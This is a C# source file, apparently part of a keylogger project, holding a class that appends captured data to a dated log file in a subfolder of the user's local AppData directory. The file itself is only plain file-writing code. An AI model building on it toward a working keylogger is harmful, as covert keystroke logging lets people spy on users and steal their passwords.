using KeyLoggerConfig;
using System;
using System.IO;

namespace KeyLogger
{
    public class AppDataLogger : IDisposable
    {
        public AppDataLogger()
        {
            string filename = GetFilename();
            ActiveFileStream = new StreamWriter(filename, true);
        }

        StreamWriter ActiveFileStream;

        public void Write(string data)
        {
            ActiveFileStream.Write(data);
        }

        private string GetFilename()
        {
            string date = DateTime.Today.ToString("dd.MM.yyyy");

            var appDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData, Environment.SpecialFolderOption.Create);

            string logsFolder = Path.Combine(appDataFolder, Config.AppDataSubfolder);

            Directory.CreateDirectory(logsFolder);

            string filename = Config.FilenameTemplate.Replace("{date}", date);
            return Path.Combine(logsFolder, filename);
        }

        public void Dispose()
        {
            ActiveFileStream?.Dispose();
        }
    }
}
